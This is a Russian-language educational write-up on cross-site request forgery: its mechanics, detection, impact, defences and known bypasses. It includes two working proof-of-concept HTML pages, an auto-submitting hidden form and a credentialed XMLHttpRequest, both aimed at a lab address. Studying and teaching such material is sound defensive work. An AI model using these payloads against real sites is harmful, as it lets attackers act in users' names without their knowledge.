# CSRF атака

## Описание

CSRF - это атака при которой хакер выполняет массу различных действий от имени других, зарегистрированных посетителей. Для управления сессией пользователя  многие веб-приложения используют cookie. Браузер устроен так, что, если у него есть куки пользователя для данного домена и пути, он их автоматически отправляет вместе с HTTP-запросом.

Атаки по подделке межсайтовых запросов (CSRF) происходит в два этапа:
1) При нажатии пользователем на ссылку или при загрузке страницы злоумышленника. Эта ссылка запускает поддельный запрос, содержащий вредоносный код. Вредоносный код обычно размещается на веб-сайте принадлежащим злоумышленнику, в другом домене.
  

2) Код отправит специально созданный запрос из браузера "жертвы" (JavaScript вызывает form.submit, отправляя таким образом форму на mail.com). Запрос будет отправлен с использованием учетных данных HTTP или файлов cookie со значениями, которые хочет злоумышленник. Он будет считаться законным, даже если пользователь будет отправлять запрос по команде злоумышленника.


## Классификация
*CSRF-атака с использованием запроса GET*


При щелчке вредоносной ссылки злоумышленник перенаправляет "жертву" в свое вредоносное веб-приложение, который выполняет сценарий, заставляющий браузер "жертвы" отправить незаконный (пользователь не знает о том, что он отправляется) запрос, включающий в себя необходимые файлы cookie. 


*CSRF-атаки с использованием запросов POST*

Большинство запросов на выполнение действия будут осуществлятся через запросы POST, отправляющие любые параметры и значения в теле запроса. 

Для запросов POST требуется, чтобы тело запроса было добавлено к самому запросу. Используя JavaScript, злоумышленник может написать свое вредоносное веб-приложение так, чтобы при загрузке веб-страницы незаконный запрос POST отправлялся автоматически.
При загрузке страницы, заготовленная функция обеспечивает отправку формы, которая в свою очередь отправляет запрос POST. В форму включены статические параметры, где, например, example.com идентифицирует запрос как законный, поскольку он будет включать файлы cookie пользователя.


## Условия
- ОС: любая
- язык: любой
- компоненты: не имеют значения
- настройки: для управления сессиями используются cookie

## Детектирование
Проблема детектируется в ручную. 
Необходимо проверить:
1) Используется ли для управления сессией cookies.
2) наличие CSRF токена в заголовках, в cookies или в параметрах при отправке запроса.
3) заголовок Referer (наличие и адрес прихода запроса).

## Эксплуатация

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок.PNG)

На рисунке 1 показаны оригинальная страница и видоизмененный запрос, изменяющий параметр №1 с true на false.

---

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок1.PNG)

На рисунке 2 показан результат перехода по видоизмененной ссылке, показанной на рисунке 1. Как видно на рисунке 2 – пользователем, в браузере которого были сохранены cookie и, следовательно, он был залогинен на данном сайте, был отправлен запрос против его воли. 

---

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок2.PNG)

На рисунке 3 показан состав пакета, с помощью которого составили вредоносную ссылку. Во второй строке показан изначальный хост - адрес сервера, с которого и с которым проводятся манипуляции. В первой строке указан метод, команда и изменяемая переменная.

---
  ``` <!DOCTYPE html> 
  <html lang="en"> 
  <head> 
    <meta charset="UTF-8"> 
    <title>CSRF</title> 
  </head> 
  <body> 
 
  <br> 
  <p> 
    <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
      <p><input type=hidden value="false" name=settings> 
  </form> 
  </p> 
    <script type="text/javascript"> 
    document.csrf_try.submit(); 
  </script>  
  </body> 
  </html>
  ```
  Данный код представляет HTML страницу на который присутсвует вредоносный код. В form указывается имя формы, метод и "действие", в данном случае переход на страницу изменения параметра. В строке input указывается атрибут hidden, который скрывает от пользователя изменения параметра на false. После формы создается javascript, который позволяет выполнить автовыполнение формы при открытии страницы.
  Теперь, если залогиненный пользователь на ресурсе 192.168.99.100, перейдет на данную страницу, то у него изменится параметр settings 2 на false.
  
 ---

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XHR_CSRF</title>
</head>
<body>

	<script	type="text/javascript">
var xhr=new XMLHttpRequest ();
xhr.open("POST", "http://192.168.99.100:1337/change_settings_2", true);
xhr.setRequestHeader("Accept", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8");
xhr.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
 
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials=true;
var params='settings=false';
xhr.send(params);
	</script>
</body>
</html>
```
Данная эксплуатация CSRF-уязвимости позволяет заставить пользователя совершить какие-либо действия без его ведома, так как с использованием XHttpRequest возможно совершение действия без перехода на атакуемую страницу. 


## Ущерб
Злоумышленник имеет возможность совершать действия, о которых пользователь не знает от его лица. Такие как:
1) Подписаться на какую-либо страницу или сервис.
2) Отправить сообщение или письмо.
3) Поставить лайк, таким образом, раскручивая какие-либо ресурсы.
4) Перевод денег.
5) Шантажирование пользователя методами социальной инженирии.
6) И другие действия, которые позволяет делать веб-приложение.

## Защита
### Основные меры

1) GET-запросы в веб-приложении не должны выполнять каких-либо действий от лица пользователя.

2) CSRF токен 
* генерируется рандомный токен, который привязывается к сессии; 
* серве подставляет токен в форму и сверяет с сохраненным при приеме запроса; 
* атакующий не знает токена, следовательно не сможет заставить пользователя отправить запрос.
* токен хранится в базе данных (statefull метод).
* Для формирования токена необходимо использовать user id и timestamp, иначе, в первом случае, cookie одного пользователя может быть использован другим пользователем, и ,во втором случае, для ограничения времени жизни токена для защиты от использования токена  в случае его копроментации.

3) Double Submit Cookie 
* передавать токен пользователю в cookie; 
* токен вставляется в header на стороне пользователя с помощью javascript'а при запросе на сервер;
* в последующих запросах предоставляются оба токена (в cookie и в header);
* сервер обязан проверить на идентичность токен из cookie и токен, который прислал клиент в header, если оба токена совпадают, то запрос не подвергся CSRF-Атаке, в ином случае — логируем событие и отклоняем запрос.

4) SameSite Cookies (Chrome, Opera)
* cookie не нужно передавать, если запрос идет с сайта, отличного от того, на котором cookie была установлена (защита ресурса от CSRF без использования дополнительных инструментов);
* SameSite - это флаг;
* SameSite может иметь одно из двух значений:
  * Strict;
  * Lax;
* Не все браузеры сейчас поддерживает эту возможность.

5) Content-Type based protection
* пользователь должен отправить запрос с определенным заголовком Content-Type, например, application/json; 
* защиту можно обойти с использованием flash+307 redirect.

6) Referer-based protection
* пользователь должен отправить запрос с определенным значением заголовка Referer; 
* бэкенд его проверяет, если он неверный, то считается, что это CSRF-атака;
* нужно учитывать логику при построении сервера, как ему поступать, так как refer может быть скрыт и сервер не будет знать как ему постапать с запросом: отклонять его или пропускать.

7) Password confirmation / websudo
* пользователь должен подтверждать действие с помощью пароля (или секрета);
(атакующий его не знает, поэтому классическая CSRF-атака не работает).




## Обход защиты
1) Referer может быть скрыт.
2) Content-Type защиту можно обойти с использваонием flash+307 redirect.
	Пример: https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b
3) Double Submit Cookie можно обойти с помощью crlf уязвимости.
4) Если на сайте присустсвует уязвимость типа XSS, то ни одна защита от CSRF не работает.
